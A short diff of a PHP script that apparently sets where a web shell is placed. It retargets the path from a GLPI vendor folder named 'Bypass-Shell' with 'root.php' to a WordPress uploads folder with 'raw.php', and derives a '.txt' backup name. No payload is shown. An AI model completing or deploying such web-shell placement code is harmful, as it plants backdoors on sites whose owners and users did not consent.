@@ -1,7 +1,7 @@
 <?php
 
-$path = "/home/cws/public_html/glpi/vendor/htmlawed/htmlawed/Bypass-Shell";
-$shell_name = "root.php";
+$path = "/usr/local/www/arsip/wp-content/uploads/-";
+$shell_name = "raw.php";
 $gabung = $path . "/" . $shell_name;
 $khusus_path = $path . "/";
 $backname = explode('.', $shell_name)[0] . ".txt";
